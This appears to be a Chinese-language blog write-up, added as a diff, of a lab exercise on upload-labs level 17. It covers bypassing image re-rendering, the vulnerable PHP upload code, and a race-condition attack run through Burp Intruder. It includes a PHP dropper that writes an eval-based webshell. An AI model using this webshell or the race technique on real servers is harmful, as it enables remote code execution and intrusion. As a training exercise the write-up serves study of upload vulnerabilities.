@@ -1,0 +1,90 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<h1 id="%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86"><span style="color:#6eaad7;"><strong>二次渲染原理</strong></span></h1>
+<blockquote>
+<p style="margin-left:0;"><strong>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。</strong></p>
+</blockquote>
+<h1 style="margin-left:0px;"><span style="color:#6eaad7;">绕过方法</span></h1>
+<h2>1.配合条件竞争漏洞</h2>
+<blockquote>
+<p>竞争条件是指多个线程在没有进行锁操作或者同步操作的情况下同时访问同一个共享代码，变量，文件等，运行的结果依赖于不同线程访问数据的顺序。</p>
+</blockquote>
+<h2>2.配合文件包含漏洞</h2>
+<blockquote>
+<p>将一句话木马插入到网站二次处理后的图片中，也就是将二次渲染后保留的图片和一句话木马制作成图片马，再配合文件包含漏洞解析图片马中的代码，获取webshell。</p>
+</blockquote>
+<h1><span style="color:#6eaad7;"><strong>源码</strong></span></h1>
+<pre><code>$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];   //获取图片的名字
+    $temp_file = $_FILES['upload_file']['tmp_name'];  //获取图片的临时存储路径
+    $file_ext = substr($file_name,strrpos($file_name,".")+1); //通过文件名截取图片的后缀
+    $upload_file = $UPLOAD_ADDR . '/' . $file_name;   //构造图片的上传路径，这里暂时重构图片的后缀名
+
+ if(move_uploaded_file($temp_file, $upload_file)){     //将文件$temp_file移动到$upload_file.
+    //也就是说没有将文件后缀名进行验证就将文件移动到指定的路径了
+    //相当于上传文件 ， 此时webshell.jpg文件已经上传
+我才发现我这里有个思维错误:我以为这是将$temp_file的路径替换成$upload_file的路径，即我以为执行此行代码$upload_file的路径是本地路径；但是！！！！正确的应该是：执行完此行代码,
+$temp_file文件已经到了$upload_fiel所在的路径 （代码审计能力太差了呜呜呜我是菜鸡）
+
+ if(in_array($file_ext,$ext_arr)){   
+    $img_path = $UPLOAD_ADDR . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
+    //取一个随机的时间数命名，再加上得到的文件后缀。
+    rename($upload_file, $img_path);  //重命名，将$upload_file重命名为$img_file.  即是将webshell.jpg重命名。
+    //为什么我们上传文件webshell.jpg，在上传目录上却看不到文件webshell.jpg的原因就在于重命名，如果注释掉这段代码的话是可以在上传目录中看到webshell.jpg的
+
+            unlink($upload_file);   //删除掉webshell.jpg文件
+
+             $is_upload = true;
+        }else{
+            $msg = "只允许上传.jpg|.png|.gif类型文件！";
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传失败！';
+    }
+}</code></pre>
+<p style="margin-left:0;"><span style="color:#79c6cd;"><strong>代码处理流程：声明一个数组，保存着允许上传的文件类型--&gt;获取文件名和文件临时存储路径--&gt;截取文件名--&gt;构造文件上传后的存储路径--&gt;对文件进行转存--&gt;比对白名单，</strong></span></p>
+<p style="margin-left:0;"><span style="color:#79c6cd;"><strong>如果存在就对文件进行重命名--&gt;否则就删除文件</strong>。</span></p>
+<p style="margin-left:0;"><strong><span style="color:#79c6cd;">通过上面代码我们发现：</span></strong></p>
+<p style="margin-left:0;"><strong><span style="color:#79c6cd;">  服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。</span></strong></p>
+<p style="margin-left:0;"></p>
+<h1 style="margin-left:0px;"><span style="color:#6eaad7;">条件竞争上传绕过实操</span></h1>
+<blockquote>
+<p><span style="color:#0d0016;">思路：我们可以上传一个有写文件功能的木马文件，后端会先将其放置在临时存放路径，然后才检验上传文件是否和要求的文件一致，如果不符合就会删除文件。那如果我们在 从文件上传成功到开始检验文件后缀 的 这一段时间，我们进行访问该文件，那么就会导致防护被绕过，那就是相当于重命名这一过程就会被绕过，那么只要在删除改木马文件之前访问该木马文件，我们就可以写入新木马。（打个比方就是 你打开一个文件，然后你要删除它，这个时候系统就会提示你该文件正在被访问或者占用，无法执行删除命令）</span></p>
+</blockquote>
+<p style="margin-left:0;">以upload-labs靶场的第十七关为例：</p>
+<p style="margin-left:0;">①上传有写入功能的木马，代码如下：</p>
+<pre><code class="language-php">&lt;?php 
+$f= fopen ("test.php","w") ;
+fputs ($f,'&lt;?php @eval($_POST['cmd']);?&gt;');
+?&gt;</code></pre>
+<p style="margin-left:0;">②上传该木马，抓包，营造上传场景</p>
+<p style="margin-left:0;"><img alt="" height="485" src="image\edee669844ae47a386da89a7c6c2d64a.png" width="964"/></p>
+<p><img alt="" height="591" src="image\13503ee269d24327af1bd8c1dda74bb2.png" width="1148"/> </p>
+<p> 发送到测试器中</p>
+<p><img alt="" height="508" src="image\d1014ec5cc00454f85d66968bba426d7.png" width="1200"/></p>
+<p>在报文头中加上<span style="color:#be191c;"><strong>&amp;a=1</strong></span>,并且选中<strong><span style="color:#be191c;">1</span></strong></p>
+<p><img alt="" height="522" src="image\07a66bf9dfeb495ba4306cf2cac0b219.png" width="865"/></p>
+<p><span style="color:#be191c;"><strong> 营造进行1000次不断上次该木马文件的场景</strong></span></p>
+<p> ③访问该木马文件，抓包，并营造不断访问该木马文件的场景</p>
+<p><img alt="" height="349" src="image\fd049bc2057b46378f4f2bf5a2a1e615.png" width="755"/></p>
+<p> 依旧是将数据包发送至测试器 </p>
+<p><img alt="" height="384" src="image\ce80579250484e78982e7e325ea4df69.png" width="1121"/></p>
+<p> </p>
+<p> 在报文头加上<span style="color:#be191c;"><strong>?a=1</strong></span><span style="color:#0d0016;">,并且选中</span><strong><span style="color:#be191c;">1 </span></strong></p>
+<p><img alt="" height="522" src="image\07a66bf9dfeb495ba4306cf2cac0b219.png" width="865"/></p>
+<p><span style="color:#be191c;"><strong> 营造进行1000次不断访问该木马文件的场景。</strong></span></p>
+<p>④将两个数据包的线程数都调为20</p>
+<p><img alt="" height="543" src="image\55c474c5c0d949309b473b1879687e8b.png" width="766"/></p>
+<p>⑤将两个数据包开始进行攻击</p>
+<p></p>
+<p> 无语死了，老是不成功，过会再试试</p>
+<p></p>
+<p> </p>
+</div>
+</div>
